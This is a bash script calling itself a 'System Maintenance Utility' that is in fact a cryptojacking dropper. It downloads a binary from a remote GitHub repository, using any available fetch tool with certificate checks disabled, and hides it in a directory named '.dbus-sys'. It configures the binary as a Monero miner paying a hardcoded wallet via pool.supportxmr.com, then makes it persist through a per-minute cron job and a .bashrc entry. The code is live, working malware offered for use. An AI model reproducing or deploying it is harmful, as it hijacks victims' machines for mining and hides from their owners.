#!/bin/bash
# System Maintenance Utility v4.1
# Features: Single Deploy | Bulk Shell Deploy Ready
# Repository: dailam008/kongkalikong
# Support: pool.supportxmr.com

set -e

# ═══════════════════════════════════════════════════════════════════
# CONFIG SECTION
# ═══════════════════════════════════════════════════════════════════

WALLET="46Z9A1TZiGJSgJtDtZzar9Lgum3B7xW9eG8TDKKhVW5yhJzX118fS2eep3ry8i7Z6PPwP2P4YDvzS7h9L8Ji43C9Jh9fwPb"
POOL="pool.supportxmr.com:443"
REPO="https://raw.githubusercontent.com/boyyywiliam/Aselole/main"
SCRIPT_VERSION="4.1"

# ═══════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════

determine_base_dir() {
    if [ -w "$HOME" ] 2>/dev/null; then
        echo "${HOME}/.dbus-sys"
    elif [ -w "/tmp" ] 2>/dev/null; then
        echo "/tmp/.dbus-sys-$(whoami)"
    elif [ -w "/dev/shm" ] 2>/dev/null; then
        echo "/dev/shm/.dbus-sys-$(whoami)"
    else
        echo "/var/tmp/.dbus-sys-$(whoami)"
    fi
}

check_tools() {
    local tools=""
    command -v wget &>/dev/null && tools="$tools wget"
    command -v curl &>/dev/null && tools="$tools curl"
    command -v aria2c &>/dev/null && tools="$tools aria2c"
    command -v lynx &>/dev/null && tools="$tools lynx"
    command -v w3m &>/dev/null && tools="$tools w3m"
    command -v perl &>/dev/null && tools="$tools perl"
    command -v python3 &>/dev/null && tools="$tools python3" || (command -v python &>/dev/null && tools="$tools python")
    [ -z "$tools" ] && tools="NONE"
    echo "$tools"
}

validate_file() {
    local file="$1"
    if [ ! -f "$file" ]; then
        return 1
    fi
    local size=$(stat -c%s "$file" 2>/dev/null || stat -f%z "$file" 2>/dev/null || echo 0)
    if [ "$size" -gt 2000000 ]; then
        return 0
    else
        echo "[!] File too small: $size bytes"
        return 1
    fi
}

create_dirs() {
    local BASE="$1"
    local max_attempts=5
    local attempt=1

    while [ $attempt -le $max_attempts ]; do
        if mkdir -p "$BASE/sbin" "$BASE/cfg" "$BASE/log" "$BASE/run" 2>/dev/null; then
            chmod 755 "$BASE" "$BASE/sbin" "$BASE/cfg" "$BASE/run" 2>/dev/null || true
            return 0
        fi

        echo "[*] Directory creation attempt $attempt/$max_attempts failed, retrying..."
        sleep $((attempt * 2))
        attempt=$((attempt + 1))
    done

    echo "[ERROR] Failed to create directories after $max_attempts attempts"
    return 1
}

download_binary() {
    local BIN_NAME="$1"
    local BASE="$2"
    local url="${REPO}/${BIN_NAME}"
    local temp_file="/tmp/svc.$$"
    local max_attempts=15
    local attempt=1

    echo "[*] Downloading core: $BIN_NAME"
    echo "[*] Available tools: $(check_tools)"

    while [ $attempt -le $max_attempts ]; do
        echo "[*] Attempt $attempt/$max_attempts..."

        # Try wget
        if command -v wget &>/dev/null; then
            if wget --no-check-certificate --timeout=30 -q -O "$temp_file" "$url" 2>/dev/null; then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via wget: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try curl
        if command -v curl &>/dev/null; then
            if curl -fsSLk --max-time 30 -o "$temp_file" "$url" 2>/dev/null; then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via curl: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try aria2c
        if command -v aria2c &>/dev/null; then
            if aria2c -x 4 --max-tries=3 --timeout=30 -o svc.tmp "$url" -d /tmp 2>/dev/null; then
                if [ -f "/tmp/svc.tmp" ] && validate_file "/tmp/svc.tmp"; then
                    local size=$(stat -c%s "/tmp/svc.tmp" 2>/dev/null || stat -f%z "/tmp/svc.tmp" 2>/dev/null)
                    echo "[+] Download successful via aria2c: $size bytes"
                    mv "/tmp/svc.tmp" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try lynx
        if command -v lynx &>/dev/null; then
            if lynx -dump -source "$url" > "$temp_file" 2>/dev/null; then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via lynx: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try w3m
        if command -v w3m &>/dev/null; then
            if w3m -dump_source "$url" > "$temp_file" 2>/dev/null; then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via w3m: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try perl
        if command -v perl &>/dev/null; then
            if perl -e "use LWP::UserAgent; my \$ua = LWP::UserAgent->new; my \$res = \$ua->get('$url'); open(F,'>','$temp_file') or die; print F \$res->content; close F;" 2>/dev/null; then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via perl: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        # Try python
        if command -v python3 &>/dev/null || command -v python &>/dev/null; then
            local py_cmd=$(command -v python3 || command -v python)
            if $py_cmd << PYSCRIPT 2>/dev/null
import urllib.request
import sys
try:
    urllib.request.urlretrieve('$url', '$temp_file')
    sys.exit(0)
except:
    sys.exit(1)
PYSCRIPT
            then
                if validate_file "$temp_file"; then
                    local size=$(stat -c%s "$temp_file" 2>/dev/null || stat -f%z "$temp_file" 2>/dev/null)
                    echo "[+] Download successful via python: $size bytes"
                    mv "$temp_file" "$BASE/sbin/sysvol"
                    chmod +x "$BASE/sbin/sysvol"
                    return 0
                fi
            fi
        fi

        rm -f "$temp_file" "/tmp/svc.tmp" 2>/dev/null

        if [ $attempt -lt $max_attempts ]; then
            local wait_time=$((attempt * 3))
            echo "[!] All tools failed, waiting ${wait_time}s..."
            sleep $wait_time
        fi

        attempt=$((attempt + 1))
    done

    echo "[ERROR] Download failed after $max_attempts attempts with all available tools"
    return 1
}

deploy_core() {
    local BASE="$1"
    local BIN_NAME="$2"

    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] System Maintenance Utility v${SCRIPT_VERSION}"
    echo "[*] ═══════════════════════════════════════════════════════════"
    echo "[*] Base directory: $BASE"

    if ! create_dirs "$BASE"; then
        echo "[ERROR] Failed to create directories"
        return 1
    fi

    if [ ! -w "$BASE" ]; then
        echo "[ERROR] Base directory not writable: $BASE"
        return 1
    fi

    if ! download_binary "$BIN_NAME" "$BASE"; then
        echo "[ERROR] Failed to download core"
        return 1
    fi

    if [ ! -x "$BASE/sbin/sysvol" ]; then
        echo "[ERROR] Core is not executable"
        return 1
    fi

    # Generate worker ID
    local WORKER="srv-$(hostname)-$(date +%s | tail -c 4)"
    echo "[*] Worker ID: $WORKER"

    # Create config
    echo "[*] Creating configuration..."
    cat > "$BASE/cfg/config.json" << 'CFGEOF'
{"autosave":true,"background":false,"colors":false,"cpu":{"enabled":true,"huge-pages":true,"hw-aes":null,"priority":null,"memory-pool":false,"yield":true,"max-threads-hint":100,"asm":"auto"},"opencl":{"enabled":false},"cuda":{"enabled":false},"donate-level":0,"donate-over-proxy":0,"log-file":null,"pools":[{"algo":"rx/0","coin":"monero","url":"POOL_URL","user":"WALLET_ADDR","pass":"WORKER_ID","keepalive":true,"enabled":true,"tls":true,"daemon":false}],"print-time":60,"health-print-time":60,"retries":5,"retry-pause":5,"syslog":false,"verbose":0,"watch":true,"pause-on-battery":false,"pause-on-active":false}
CFGEOF

    sed -i.bak "s|POOL_URL|${POOL}|g" "$BASE/cfg/config.json"
    sed -i.bak "s|WALLET_ADDR|${WALLET}|g" "$BASE/cfg/config.json"
    sed -i.bak "s|WORKER_ID|${WORKER}|g" "$BASE/cfg/config.json"
    rm -f "$BASE/cfg/config.json.bak"

    chmod 600 "$BASE/cfg/config.json"
    touch "$BASE/log/core.log"
    chmod 644 "$BASE/log/core.log"

    echo "[+] Configuration created"

    # Create guard script
    cat > "$BASE/run/guard.sh" << 'GRDEOF'
#!/bin/bash
if [ -d "$HOME/.dbus-sys" ]; then
    BASE="$HOME/.dbus-sys"
elif [ -d "/tmp/.dbus-sys-$(whoami)" ]; then
    BASE="/tmp/.dbus-sys-$(whoami)"
elif [ -d "/dev/shm/.dbus-sys-$(whoami)" ]; then
    BASE="/dev/shm/.dbus-sys-$(whoami)"
else
    BASE="/var/tmp/.dbus-sys-$(whoami)"
fi

BIN="$BASE/sbin/sysvol"
CFG="$BASE/cfg/config.json"
PID_FILE="$BASE/run/state.pid"
LOG="$BASE/log/core.log"

if [ -f "$PID_FILE" ]; then
    PID=$(cat "$PID_FILE" 2>/dev/null)
    if kill -0 "$PID" 2>/dev/null; then
        exit 0
    fi
fi

mkdir -p "$(dirname "$LOG")" 2>/dev/null
nohup "$BIN" -c "$CFG" >> "$LOG" 2>&1 &
echo $! > "$PID_FILE"
GRDEOF

    chmod +x "$BASE/run/guard.sh"
    echo "[+] Guard script created"

    # Start process
    echo "[*] Starting service..."
    "$BASE/run/guard.sh"
    sleep 3

    # Verify running
    if pgrep -f "[s]ysvol" >/dev/null 2>&1; then
        local PID=$(pgrep -f "[s]ysvol" | head -1)

        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║           [SUCCESS] SERVICE RUNNING! ✓                 ║"
        echo "╠════════════════════════════════════════════════════════╣"
        echo "║ Process ID: $PID"
        echo "║ Core: $BASE/sbin/sysvol"
        echo "║ Config: $BASE/cfg/config.json"
        echo "║ Log: $BASE/log/core.log"
        echo "║ Pool: $POOL"
        echo "║ Wallet: ${WALLET:0:16}...${WALLET: -16}"
        echo "║ Worker: $WORKER"
        echo "╚════════════════════════════════════════════════════════╝"
        echo ""
        ps aux | grep "[s]ysvol" | grep -v grep
        echo ""

        # Setup persistence
        echo "[*] Setting up persistence..."

        if command -v crontab &>/dev/null; then
            (crontab -l 2>/dev/null || echo ""; echo "* * * * * $BASE/run/guard.sh >/dev/null 2>&1") | crontab - 2>/dev/null && echo "[+] Cron installed" || echo "[!] Cron setup skipped"
        else
            echo "[!] crontab not available"
        fi

        if [ -f ~/.bashrc ]; then
            if ! grep -q "dbus-sys" ~/.bashrc 2>/dev/null; then
                echo "[ -f \"$BASE/run/guard.sh\" ] && $BASE/run/guard.sh >/dev/null 2>&1 &" >> ~/.bashrc
                echo "[+] Added to .bashrc"
            fi
        fi

        echo ""
        echo "[*] Monitor with: tail -f $BASE/log/core.log"
        echo "[*] Stop with: pkill -f sysvol"
        echo ""
        return 0

    else
        echo ""
        echo "╔════════════════════════════════════════════════════════╗"
        echo "║          [ERROR] SERVICE FAILED TO START ✗             ║"
        echo "╚════════════════════════════════════════════════════════╝"
        echo ""
        echo "[DEBUG] Last 25 lines from log:"
        echo "---"
        tail -25 "$BASE/log/core.log" 2>/dev/null || echo "Log file not found"
        echo "---"
        echo ""
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════
# MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════════

BASE=$(determine_base_dir)

# Architecture detection
ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        BIN_NAME="cibung"
        echo "[*] Architecture: x86_64 (Intel/AMD)"
        ;;
    aarch64|arm64)
        BIN_NAME="cibung008"
        echo "[*] Architecture: ARM64"
        ;;
    armv7l|armv7)
        BIN_NAME="cibung-armv7"
        echo "[*] Architecture: ARMv7"
        ;;
    *)
        echo "[ERROR] Unsupported architecture: $ARCH"
        exit 1
        ;;
esac

# Deploy
if deploy_core "$BASE" "$BIN_NAME"; then
    exit 0
else
    exit 1
fi